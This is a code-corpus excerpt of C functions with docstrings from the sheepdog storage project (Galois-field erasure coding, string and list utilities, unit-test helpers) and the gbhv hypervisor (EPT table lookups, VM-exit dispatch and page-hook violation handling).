{"docstring": "/* initialize the data structures used for computations in GF. */\n", "func_signal": "static void generate_gf(void)", "code": "{\n\tint i;\n\tuint8_t mask;\n\n\tmask = 1;                     /* x ** 0 = 1 */\n\tgf_exp[8] = 0;          /* will be updated at the end of the 1st loop */\n\t/*\n\t * first, generate the (polynomial representation of) powers of \\alpha,\n\t * which are stored in gf_exp[i] = \\alpha ** i .\n\t * At the same time build gf_log[gf_exp[i]] = i .\n\t * The first 8 powers are simply bits shifted to the left.\n\t */\n\tfor (i = 0; i < 8; i++, mask <<= 1) {\n\t\tgf_exp[i] = mask;\n\t\tgf_log[gf_exp[i]] = i;\n\t\t/*\n\t\t * If Pp[i] == 1 then \\alpha ** i occurs in poly-repr\n\t\t * gf_exp[8] = \\alpha ** 8\n\t\t */\n\t\tif (Pp[i] == '1')\n\t\t\tgf_exp[8] ^= mask;\n\t}\n\t/*\n\t * now gf_exp[8] = \\alpha ** 8 is complete, so can also\n\t * compute its inverse.\n\t */\n\tgf_log[gf_exp[8]] = 8;\n\t/*\n\t * Poly-repr of \\alpha ** (i+1) is given by poly-repr of\n\t * \\alpha ** i shifted left one-bit and accounting for any\n\t * \\alpha ** 8 term that may occur when poly-repr of\n\t * \\alpha ** i is shifted.\n\t */\n\tmask = 1 << 7;\n\tfor (i = 9; i < 255; i++) {\n\t\tif (gf_exp[i - 1] >= mask)\n\t\t\tgf_exp[i] = gf_exp[8] ^ ((gf_exp[i - 1] ^ mask) << 1);\n\t\telse\n\t\t\tgf_exp[i] = gf_exp[i - 1] << 1;\n\t\tgf_log[gf_exp[i]] = i;\n\t}\n\t/* log(0) is not defined, so use a special value */\n\tgf_log[0] = 255;\n\t/* set the extended gf_exp values for fast multiply */\n\tfor (i = 0; i < 255; i++)\n\t\tgf_exp[i + 255] = gf_exp[i];\n\n\t/*\n\t * again special cases. 0 has no inverse. This used to\n\t * be initialized to 255, but it should make no difference\n\t * since noone is supposed to read from here.\n\t */\n\tinverse[0] = 0;\n\tinverse[1] = 1;\n\tfor (i = 2; i <= 255; i++)\n\t\tinverse[i] = gf_exp[255 - gf_log[i]];\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* Return EEXIST when path exists but not a directory */\n", "func_signal": "int xmkdir(const char *pathname, mode_t mode)", "code": "{\n\tif (mkdir(pathname, mode) < 0) {\n\t\tstruct stat st;\n\n\t\tif (errno != EEXIST)\n\t\t\treturn -1;\n\n\t\tif (stat(pathname, &st) < 0)\n\t\t\treturn -1;\n\n\t\tif (!S_ISDIR(st.st_mode)) {\n\t\t\terrno = EEXIST;\n\t\t\treturn -1;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* zeroed memory version of posix_memalign() */\n", "func_signal": "void *xvalloc(size_t size)", "code": "{\n\tvoid *ret = NULL;\n\tint err = posix_memalign((void **)&ret, getpagesize(), size);\n\tif (unlikely(err))\n\t\tpanic(\"Out of memory\");\n\tmemset(ret, 0, size);\n\treturn ret;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Build decode matrix into some memory space.\n *\n * @param matrix a space allocated for a d by d matrix\n */\n", "func_signal": "static void\nbuild_decode_matrix_into_space(const struct fec *const code,\n\t\t\t       const int *const idx,\n\t\t\t       const unsigned d, uint8_t *const matrix)", "code": "{\n\tunsigned char i;\n\tuint8_t *p;\n\tfor (i = 0, p = matrix; i < d; i++, p += d) {\n\t\tif (idx[i] < d) {\n\t\t\tmemset(p, 0, d);\n\t\t\tp[i] = 1;\n\t\t} else {\n\t\t\tmemcpy(p, &(code->enc_matrix[idx[i] * code->d]), d);\n\t\t}\n\t}\n\t_invert_mat(matrix, d);\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * We regard 'data' as string when it contains '\\0' in the first 256 characters.\n */\n", "func_signal": "const char *data_to_str(void *data, size_t data_length)", "code": "{\n\tdata_length = MIN(data_length, 256);\n\n\tif (data == NULL)\n\t\treturn \"(null)\";\n\n\tif (memchr(data, '\\0', data_length) != NULL)\n\t\treturn data;\n\n\treturn \"(not string)\";\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * _invert_mat() takes a matrix and produces its inverse\n * d is the size of the matrix.\n * (Gauss-Jordan, adapted from Numerical Recipes in C)\n * Return non-zero if singular.\n */\n", "func_signal": "static void _invert_mat(uint8_t *src, unsigned d)", "code": "{\n\tuint8_t c, *p;\n\tunsigned irow = 0;\n\tunsigned icol = 0;\n\tunsigned row, col, i, ix;\n\n\tunsigned *indxc = (unsigned *)xmalloc(d * sizeof(unsigned));\n\tunsigned *indxr = (unsigned *)xmalloc(d * sizeof(unsigned));\n\tunsigned *ipiv = (unsigned *)xmalloc(d * sizeof(unsigned));\n\tuint8_t *id_row = NEW_GF_MATRIX(1, d);\n\n\tmemset(id_row, '\\0', d * sizeof(uint8_t));\n\t/* ipiv marks elements already used as pivots. */\n\tfor (i = 0; i < d; i++)\n\t\tipiv[i] = 0;\n\n\tfor (col = 0; col < d; col++) {\n\t\tuint8_t *pivot_row;\n\t\t/*\n\t\t * Zeroing column 'col', look for a non-zero element.\n\t\t * First try on the diagonal, if it fails, look elsewhere.\n\t\t */\n\t\tif (ipiv[col] != 1 && src[col * d + col] != 0) {\n\t\t\tirow = col;\n\t\t\ticol = col;\n\t\t\tgoto found_piv;\n\t\t}\n\t\tfor (row = 0; row < d; row++) {\n\t\t\tif (ipiv[row] != 1) {\n\t\t\t\tfor (ix = 0; ix < d; ix++) {\n\t\t\t\t\tif (ipiv[ix] == 0) {\n\t\t\t\t\t\tif (src[row * d + ix] != 0) {\n\t\t\t\t\t\t\tirow = row;\n\t\t\t\t\t\t\ticol = ix;\n\t\t\t\t\t\t\tgoto found_piv;\n\t\t\t\t\t\t}\n\t\t\t\t\t} else\n\t\t\t\t\t\tsd_assert(ipiv[ix] <= 1);\n\t\t\t\t}\n\t\t\t}\n\t\t}\nfound_piv:\n\t\t++(ipiv[icol]);\n\t\t/*\n\t\t * swap rows irow and icol, so afterwards the diagonal\n\t\t * element will be correct. Rarely done, not worth\n\t\t * optimizing.\n\t\t */\n\t\tif (irow != icol)\n\t\t\tfor (ix = 0; ix < d; ix++)\n\t\t\t\tSWAP(src[irow*d + ix], src[icol*d + ix]);\n\t\tindxr[col] = irow;\n\t\tindxc[col] = icol;\n\t\tpivot_row = &src[icol * d];\n\t\tc = pivot_row[icol];\n\t\tsd_assert(c != 0);\n\t\tif (c != 1) {   /* otherwise this is a NOP */\n\t\t\t/*\n\t\t\t * this is done often , but optimizing is not so\n\t\t\t * fruitful, at least in the obvious ways (unrolling)\n\t\t\t */\n\t\t\tc = inverse[c];\n\t\t\tpivot_row[icol] = 1;\n\t\t\tfor (ix = 0; ix < d; ix++)\n\t\t\t\tpivot_row[ix] = gf_mul(c, pivot_row[ix]);\n\t\t}\n\t\t/*\n\t\t * from all rows, remove multiples of the selected row\n\t\t * to zero the relevant entry (in fact, the entry is not zero\n\t\t * because we know it must be zero).\n\t\t * (Here, if we know that the pivot_row is the identity,\n\t\t * we can optimize the addmul).\n\t\t */\n\t\tid_row[icol] = 1;\n\t\tif (memcmp(pivot_row, id_row, d * sizeof(uint8_t)) != 0) {\n\t\t\tfor (p = src, ix = 0; ix < d; ix++, p += d) {\n\t\t\t\tif (ix != icol) {\n\t\t\t\t\tc = p[icol];\n\t\t\t\t\tp[icol] = 0;\n\t\t\t\t\taddmul(p, pivot_row, c, d);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tid_row[icol] = 0;\n\t}                           /* done all columns */\n\tfor (col = d; col > 0; col--)\n\t\tif (indxr[col-1] != indxc[col-1])\n\t\t\tfor (row = 0; row < d; row++)\n\t\t\t\tSWAP(src[row * d + indxr[col-1]],\n\t\t\t\t     src[row * d + indxc[col-1]]);\n\tfree(indxc);\n\tfree(indxr);\n\tfree(ipiv);\n\tfree(id_row);\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* Concatenate 'segs' with '/' separators. */\n", "func_signal": "void make_path(char *path, size_t size, size_t nr_segs, const char **segs)", "code": "{\n\tfor (int i = 0; i < nr_segs; i++) {\n\t\tint len = snprintf(path, size, \"/%s\", segs[i]);\n\t\tpath += len;\n\t\tsize -= len;\n\t}\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* computes C = AB where A is dp*d, B is d*m, C is dp*m */\n", "func_signal": "static void _matmul(uint8_t *a, uint8_t *b, uint8_t *c, unsigned dp, unsigned d,\n\t\t    unsigned m)", "code": "{\n\tunsigned row, col, i;\n\n\tfor (row = 0; row < dp; row++) {\n\t\tfor (col = 0; col < m; col++) {\n\t\t\tuint8_t *pa = &a[row * d];\n\t\t\tuint8_t *pb = &b[col];\n\t\t\tuint8_t acc = 0;\n\t\t\tfor (i = 0; i < d; i++, pa++, pb += m)\n\t\t\t\tacc ^= gf_mul(*pa, *pb);\n\t\t\tc[row * m + col] = acc;\n\t\t}\n\t}\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Trim zero blocks from the beginning and end of buffer\n *\n * This function is similar to find_zero_blocks(), but this updates 'buf' so\n * that the zero block are removed from the beginning of buffer.\n */\n", "func_signal": "void trim_zero_blocks(void *buf, uint64_t *poffset, uint32_t *plen)", "code": "{\n\tuint8_t *p = buf;\n\tuint64_t orig_offset = *poffset;\n\n\tfind_zero_blocks(buf, poffset, plen);\n\tif (orig_offset < *poffset)\n\t\tmemmove(p, p + *poffset - orig_offset, *plen);\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* remove a newline character from the end of a string */\n", "func_signal": "char *chomp(char *str)", "code": "{\n\tchar *p = strchr(str, '\\n');\n\tif (p != NULL)\n\t\t*p = '\\0';\n\n\treturn str;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * Convert a decimal string like as strtoll to uint32_t/uint16_t\n *\n * returns:\n *   - a converted value if success i.e. neither negative value nor overflow\n *   - undefined if something went wrong and set errno accordingly\n *\n * errno:\n *   - 0 if success\n *   - EINVAL if one of the following:\n *       - nptr was an empty string\n *       - there was an unconvertible character in nptr\n *   - ERANGE if negative/positive overflow occurred\n */\n", "func_signal": "uint32_t str_to_u32(const char *nptr)", "code": "{\n\tchar *endptr;\n\terrno = 0;\n\tconst long long conv = strtoll(nptr, &endptr, 10);\n\t/* empty string or unconvertible character */\n\tif (nptr == endptr || *endptr != '\\0') {\n\t\terrno = EINVAL;\n\t\treturn (uint32_t)conv;\n\t}\n\t/* negative value or overflow */\n\tif (conv < 0LL || UINT32_MAX < conv) {\n\t\terrno = ERANGE;\n\t\treturn UINT32_MAX;\n\t}\n\treturn (uint32_t)conv;\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * list_sort - sort a list\n * @priv: private data, opaque to list_sort(), passed to @cmp\n * @head: the list to sort\n * @cmp: the elements comparison function\n *\n * This function implements \"merge sort\", which has O(nlog(n))\n * complexity.\n *\n * The comparison function @cmp must return a negative value if @a\n * should sort before @b, and a positive value if @a should sort after\n * @b. If @a and @b are equivalent, and their original relative\n * ordering is to be preserved, @cmp must return 0.\n */\n", "func_signal": "void list_sort(void *priv, struct list_head *head,\n\t       int (*cmp)(void *priv, struct list_node *a,\n\t\t\t  struct list_node *b))", "code": "{\n\t/* sorted partial lists -- last slot is a sentinel */\n#define MAX_LIST_LENGTH_BITS 20\n\tstruct list_node *part[MAX_LIST_LENGTH_BITS+1];\n\tint lev;  /* index into part[] */\n\tint max_lev = 0;\n\tstruct list_node *list;\n\n\tif (list_empty(head))\n\t\treturn;\n\n\tmemset(part, 0, sizeof(part));\n\n\thead->n.prev->next = NULL;\n\tlist = head->n.next;\n\n\twhile (list) {\n\t\tstruct list_node *cur = list;\n\t\tlist = list->next;\n\t\tcur->next = NULL;\n\n\t\tfor (lev = 0; part[lev]; lev++) {\n\t\t\tcur = merge(priv, cmp, part[lev], cur);\n\t\t\tpart[lev] = NULL;\n\t\t}\n\t\tif (lev > max_lev) {\n\t\t\tif (unlikely(lev >= ARRAY_SIZE(part)-1)) {\n\t\t\t\t/*\n\t\t\t\t * list passed to list_sort() too long for\n\t\t\t\t * efficiency\n\t\t\t\t */\n\t\t\t\tlev--;\n\t\t\t}\n\t\t\tmax_lev = lev;\n\t\t}\n\t\tpart[lev] = cur;\n\t}\n\n\tfor (lev = 0; lev < max_lev; lev++)\n\t\tif (part[lev])\n\t\t\tlist = merge(priv, cmp, part[lev], list);\n\n\tmerge_and_restore_back_links(priv, cmp, head, part[max_lev], list);\n}", "path": "sheepdog/lib/util.c", "commit_date": "2018-01-16 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * modnn(x) computes x % GF_SIZE, where GF_SIZE is 2**GF_BITS - 1,\n * without a slow divide.\n */\n", "func_signal": "static uint8_t modnn(int x)", "code": "{\n\twhile (x >= 255) {\n\t\tx -= 255;\n\t\tx = (x >> 8) + (x & 255);\n\t}\n\treturn x;\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* str_to_u16 */\n", "func_signal": "static void assert_str_to_u16(uint16_t expected, const char *nptr)", "code": "{\n\terrno = 0;\n\tconst uint16_t actual = str_to_u16(nptr);\n\tconst int err = errno;\n\tTEST_ASSERT_EQUAL_INT(0, err);\n\tTEST_ASSERT_EQUAL_UINT16(expected, actual);\n}", "path": "sheepdog/tests/unit/lib/test_util.c", "commit_date": "2016-08-05 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/*\n * fast code for inverting a vandermonde matrix.\n *\n * NOTE: It assumes that the matrix is not singular and _IS_ a vandermonde\n * matrix. Only uses the second column of the matrix, containing the p_i's.\n *\n * Algorithm borrowed from \"Numerical recipes in C\" -- sec.2.8, but largely\n * revised for my purposes.\n * p = coefficients of the matrix (p_i)\n * q = values of the polynomial (known)\n */\n", "func_signal": "static void _invert_vdm(uint8_t *src, unsigned d)", "code": "{\n\tunsigned i, j, row, col;\n\tuint8_t *b, *c, *p;\n\tuint8_t t, xx;\n\n\tif (d == 1)     /* degenerate case, matrix must be p^0 = 1 */\n\t\treturn;\n\t/*\n\t * c holds the coefficient of P(x) = Prod (x - p_i), i=0..d-1\n\t * b holds the coefficient for the matrix inversion\n\t */\n\tc = NEW_GF_MATRIX(1, d);\n\tb = NEW_GF_MATRIX(1, d);\n\tp = NEW_GF_MATRIX(1, d);\n\n\tfor (j = 1, i = 0; i < d; i++, j += d) {\n\t\tc[i] = 0;\n\t\tp[i] = src[j];            /* p[i] */\n\t}\n\t/*\n\t * construct coeffs. recursively. We know c[d] = 1 (implicit)\n\t * and start P_0 = x - p_0, then at each stage multiply by\n\t * x - p_i generating P_i = x P_{i-1} - p_i P_{i-1}\n\t * After d steps we are done.\n\t */\n\tc[d - 1] = p[0];              /* really -p(0), but x = -x in GF(2^m) */\n\tfor (i = 1; i < d; i++) {\n\t\tuint8_t p_i = p[i];            /* see above comment */\n\t\tfor (j = d - 1 - (i - 1); j < d - 1; j++)\n\t\t\tc[j] ^= gf_mul(p_i, c[j + 1]);\n\t\tc[d - 1] ^= p_i;\n\t}\n\n\tfor (row = 0; row < d; row++) {\n\t\t/* synthetic division etc. */\n\t\txx = p[row];\n\t\tt = 1;\n\t\tb[d - 1] = 1;             /* this is in fact c[d] */\n\t\tfor (i = d - 1; i > 0; i--) {\n\t\t\tb[i-1] = c[i] ^ gf_mul(xx, b[i]);\n\t\t\tt = gf_mul(xx, t) ^ b[i-1];\n\t\t}\n\t\tfor (col = 0; col < d; col++)\n\t\t\tsrc[col * d + row] = gf_mul(inverse[t], b[col]);\n\t}\n\tfree(c);\n\tfree(b);\n\tfree(p);\n\treturn;\n}", "path": "sheepdog/lib/fec.c", "commit_date": "2015-09-01 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/* str_to_u32 */\n", "func_signal": "static void assert_str_to_u32(uint32_t expected, const char *nptr)", "code": "{\n\terrno = 0;\n\tconst uint32_t actual = str_to_u32(nptr);\n\tconst int err = errno;\n\tTEST_ASSERT_EQUAL_INT(0, err);\n\tTEST_ASSERT_EQUAL_UINT32(expected, actual);\n}", "path": "sheepdog/tests/unit/lib/test_util.c", "commit_date": "2016-08-05 00:00:00", "repo_name": "sheepdog/sheepdog", "stars": 978, "license": "gpl-2.0", "language": "c", "size": 24338}
{"docstring": "/**\n * Get the PML2 entry for this physical address.\n */\n", "func_signal": "PEPT_PML2_ENTRY HvEptGetPml2Entry(PVMM_PROCESSOR_CONTEXT ProcessorContext, SIZE_T PhysicalAddress)", "code": "{\n\tSIZE_T Directory, DirectoryPointer, PML4Entry;\n\tPEPT_PML2_ENTRY PML2;\n\n\tDirectory  = ADDRMASK_EPT_PML2_INDEX(PhysicalAddress);\n\tDirectoryPointer = ADDRMASK_EPT_PML3_INDEX(PhysicalAddress);\n\tPML4Entry = ADDRMASK_EPT_PML4_INDEX(PhysicalAddress);\n\n\t/* Addresses above 512GB are invalid because it is > physical address bus width */\n\tif(PML4Entry > 0)\n\t{\n\t\treturn NULL;\n\t}\n\n\tPML2 = &ProcessorContext->EptPageTable->PML2[DirectoryPointer][Directory];\n\treturn PML2;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Get the PML1 entry for this physical address if the page is split. Return NULL if the address is invalid\n * or the page wasn't already split.\n */\n", "func_signal": "PEPT_PML1_ENTRY HvEptGetPml1Entry(PVMM_PROCESSOR_CONTEXT ProcessorContext, SIZE_T PhysicalAddress)", "code": "{\n\tSIZE_T Directory, DirectoryPointer, PML4Entry;\n\tPEPT_PML2_ENTRY PML2;\n\tPEPT_PML1_ENTRY PML1;\n\tPEPT_PML2_POINTER PML2Pointer;\n\n\tDirectory = ADDRMASK_EPT_PML2_INDEX(PhysicalAddress);\n\tDirectoryPointer = ADDRMASK_EPT_PML3_INDEX(PhysicalAddress);\n\tPML4Entry = ADDRMASK_EPT_PML4_INDEX(PhysicalAddress);\n\n\t/* Addresses above 512GB are invalid because it is > physical address bus width */\n\tif (PML4Entry > 0)\n\t{\n\t\treturn NULL;\n\t}\n\n\tPML2 = &ProcessorContext->EptPageTable->PML2[DirectoryPointer][Directory];\n\n\t/* Check to ensure the page is split */\n\tif(PML2->LargePage)\n\t{\n\t\treturn NULL;\n\t}\n\n\t/* Conversion to get the right PageFrameNumber. These pointers occupy the same place in the\n\t * table and are directly convertable.\n\t */\n\tPML2Pointer = (PEPT_PML2_POINTER) PML2;\n\n\t/* If it is, translate to the PML1 pointer */\n\tPML1 = (PEPT_PML1_ENTRY) OsPhysicalToVirtual((PPHYSVOID)(PML2Pointer->PageFrameNumber * PAGE_SIZE));\n\n\tif(!PML1)\n\t{\n\t\tHvUtilLogError(\"Failed to get PML1 entry: Translating PA:%p to VA returned NULL.\", PML2Pointer->PageFrameNumber * PAGE_SIZE);\n\t\treturn NULL;\n\t}\n\n\t/* Index into PML1 for that address */\n\tPML1 = &PML1[ADDRMASK_EPT_PML1_INDEX(PhysicalAddress)];\n\n\treturn PML1;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Print a debug message to the kernel debugger.\n */\n", "func_signal": "VOID HvUtilLogDebug(LPCSTR MessageFormat, ...)", "code": "{\n\tva_list ArgumentList;\n\n\tva_start(ArgumentList, MessageFormat);\n\tvDbgPrintExWithPrefix(\"[DEBUG] \", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, MessageFormat, ArgumentList);\n\tva_end(ArgumentList);\n}", "path": "gbhv/gbhv/util.c", "commit_date": "2018-10-01 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/* Check if this exit is due to a violation caused by a currently hooked page. Returns FALSE\n * if the violation was not due to a page hook.\n * \n * If the memory access attempt was RW and the page was marked executable, the page is swapped with\n * the original page.\n * \n * If the memory access attempt was execute and the page was marked not executable, the page is swapped with\n * the hooked page.\n */\n", "func_signal": "BOOL HvExitHandlePageHookExit(\n\tPVMM_PROCESSOR_CONTEXT ProcessorContext,\n\tPVMEXIT_CONTEXT ExitContext,\n\tVMX_EXIT_QUALIFICATION_EPT_VIOLATION ViolationQualification)", "code": "{\n\tPVMM_EPT_PAGE_HOOK PageHook;\n\n\tPageHook = NULL;\n\n\t/*\n\t * The only kind of EPT violations we should expect are ones related to address translation.\n\t * If this is not one of those, something went terribly wrong with EPT and we need to try\n\t * to get out of VMX immediately.\n\t */\n\tif (!ViolationQualification.CausedByTranslation)\n\t{\n\t\treturn FALSE;\n\t}\n\n\t/* Resolve the hook if there is one */\n\tFOR_EACH_LIST_ENTRY(ProcessorContext->EptPageTable, PageHookList, VMM_EPT_PAGE_HOOK, Hook)\n\t{\n\t\t/* Check if our access happened inside a page we are currently hooking. */\n\t\tif ( Hook->PhysicalBaseAddress == (SIZE_T)PAGE_ALIGN(ExitContext->GuestPhysicalAddress) )\n\t\t{\n\t\t\tPageHook = Hook;\n\t\t\tbreak;\n\t\t}\n\t}\n\tFOR_EACH_LIST_ENTRY_END();\n\n\n\t/* If a violation happened outside of one of our hooked pages we don't\n\t * want to try to handle it.\n\t */\n\tif (!PageHook)\n\t{\n\t\treturn FALSE;\n\t}\n\n\t/* If the violation was due to trying to execute a non-executable page, that means that the currently\n\t * swapped in page is our original RW page. We need to swap in the hooked executable page (fake page)\n\t */\n\n\tif(!ViolationQualification.EptExecutable && ViolationQualification.ExecuteAccess)\n\t{\n\t\t/* Swap out the non-executable page and swap in the executable page */\n\t\tPageHook->TargetPage->Flags = PageHook->ShadowEntry.Flags;\n\n\t\t/* Redo the instruction */\n\t\tExitContext->ShouldIncrementRIP = FALSE;\n\n\t\tHvUtilLogSuccess(\"Made Exec\\n\");\n\n\t\treturn TRUE;\n\t}\n\n\t/* If the current page is executable but the memory access was a R or W operation, we want to\n\t * swap back in the original page.\n\t */\n\tif(ViolationQualification.EptExecutable \n\t\t&& (ViolationQualification.ReadAccess | ViolationQualification.WriteAccess) )\n\t{\n\t\t/* Otherwise, the executable page is swapped */\n\t\tPageHook->TargetPage->Flags = PageHook->HookedEntry.Flags;\n\n\t\t/* Redo the instruction */\n\t\tExitContext->ShouldIncrementRIP = FALSE;\n\n\t\tHvUtilLogSuccess(\"Made RW\\n\");\n\n\t\treturn TRUE;\n\t}\n\n\tHvUtilLogError(\"Hooked page had invalid page swapping logic?!\\n\");\n\n\treturn FALSE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Handle VM exits for EPT violations. Violations are thrown whenever an operation is performed\n * on an EPT entry that does not provide permissions to access that page.\n */\n", "func_signal": "VOID HvExitHandleEptViolation(PVMM_PROCESSOR_CONTEXT ProcessorContext, PVMEXIT_CONTEXT ExitContext)", "code": "{\n\tVMX_EXIT_QUALIFICATION_EPT_VIOLATION ViolationQualification;\n\n\tUNREFERENCED_PARAMETER(ProcessorContext);\n\n\tViolationQualification.Flags = ExitContext->ExitQualification;\n\n\tHvUtilLogDebug(\"EPT Violation => 0x%llX\\n\", ExitContext->GuestPhysicalAddress);\n\n\tif(HvExitHandlePageHookExit(ProcessorContext, ExitContext, ViolationQualification))\n\t{\n\t\t// Handled by page hook code.\n\t\treturn;\n\t}\n\n\tHvUtilLogError(\"Unexpected EPT violation!\\n\");\n\n\t/* Redo the instruction that caused the exception. */\n\tExitContext->ShouldStopExecution = TRUE;\n}", "path": "gbhv/gbhv/ept.c", "commit_date": "2020-10-20 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/*\n * Certain control MSRs in VMX will ask that certain bits always be 0, and some always be 1.\n * \n * In these MSR formats, the lower 32-bits specify the \"must be 1\" bits.\n * These bits are OR'd to ensure they are always 1, no matter what DesiredValue was set to.\n * \n * The high 32-bits specify the \"must be 0\" bits.\n * These bits are AND'd to ensure these bits are always 0, no matter what DesiredValue was set to.\n */\n", "func_signal": "SIZE_T HvUtilEncodeMustBeBits(SIZE_T DesiredValue, SIZE_T ControlMSR)", "code": "{\n\tLARGE_INTEGER ControlMSRLargeInteger;\n\n\t// LARGE_INTEGER provides a nice interface to get the top 32 bits of a 64-bit integer\n\tControlMSRLargeInteger.QuadPart = ControlMSR;\n\n\tDesiredValue &= ControlMSRLargeInteger.HighPart;\n\tDesiredValue |= ControlMSRLargeInteger.LowPart;\n\n\treturn DesiredValue;\n}", "path": "gbhv/gbhv/util.c", "commit_date": "2018-10-01 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
{"docstring": "/**\n * Dispatch to the correct handler function given the exit code.\n */\n", "func_signal": "BOOL HvExitDispatchFunction(PVMM_PROCESSOR_CONTEXT ProcessorContext, PVMEXIT_CONTEXT ExitContext)", "code": "{\n\tVMX_ERROR VmError;\n\tSIZE_T GuestInstructionLength;\n\n\tVmError = 0;\n\n\t/*\n\t * Choose an appropriate function to handle our exit.\n\t */\n\tswitch (ExitContext->ExitReason.BasicExitReason)\n\t{\n\t\t/*\n\t\t * The following instructions cause VM exits when they are executed in VMX non-root operation: CPUID, GETSEC,1\n\t\t * INVD, and XSETBV. This is also true of instructions introduced with VMX, which include: INVEPT, INVVPID,\n\t\t * VMCALL, VMCLEAR, VMLAUNCH, VMPTRLD, VMPTRST, VMRESUME, VMXOFF, and VMXON.\n\t\t *\n\t\t * GETSEC will never exit because we will never run in SMX mode.\n\t\t */\n\tcase VMX_EXIT_REASON_EXECUTE_CPUID:\n\t\tHvExitHandleCpuid(ProcessorContext, ExitContext);\n\t\tbreak;\n\tcase VMX_EXIT_REASON_EXECUTE_INVD:\n\t\t__wbinvd();\n\t\tbreak;\n\tcase VMX_EXIT_REASON_EXECUTE_XSETBV:\n\t\t_xsetbv((UINT32)ExitContext->GuestContext->GuestRCX,\n\t\t\tExitContext->GuestContext->GuestRDX << 32 |\n\t\t\tExitContext->GuestContext->GuestRAX);\n\t\tbreak;\n\tcase VMX_EXIT_REASON_EPT_MISCONFIGURATION:\n\t\tHvExitHandleEptMisconfiguration(ProcessorContext, ExitContext);\n\t\tbreak;\n\tcase VMX_EXIT_REASON_EPT_VIOLATION:\n\t\tHvExitHandleEptViolation(ProcessorContext, ExitContext);\n\t\tbreak;\n\tdefault:\n\t\tHvExitHandleUnknownExit(ProcessorContext, ExitContext);\n\t\tbreak;\n\t}\n\n\tif (ExitContext->ShouldStopExecution)\n\t{\n\t\tHvUtilLogError(\"HvExitDispatchFunction: Leaving VMX mode.\\n\");\n\t\treturn FALSE;\n\t}\n\n\t/* If we're an 'instruction' exit, we need to act like a fault handler and move the instruction pointer forward. */\n\tif(ExitContext->ShouldIncrementRIP)\n\t{\n\t\tVmxVmreadFieldToImmediate(VMCS_VMEXIT_INSTRUCTION_LENGTH, &GuestInstructionLength);\n\n\t\tExitContext->GuestRIP += GuestInstructionLength;\n\n\t\tVmxVmwriteFieldFromImmediate(VMCS_GUEST_RIP, ExitContext->GuestRIP);\n\t}\n\n\treturn TRUE;\n}", "path": "gbhv/gbhv/exit.c", "commit_date": "2020-04-02 00:00:00", "repo_name": "Gbps/gbhv", "stars": 764, "license": "cc-by-4.0", "language": "c", "size": 18159}
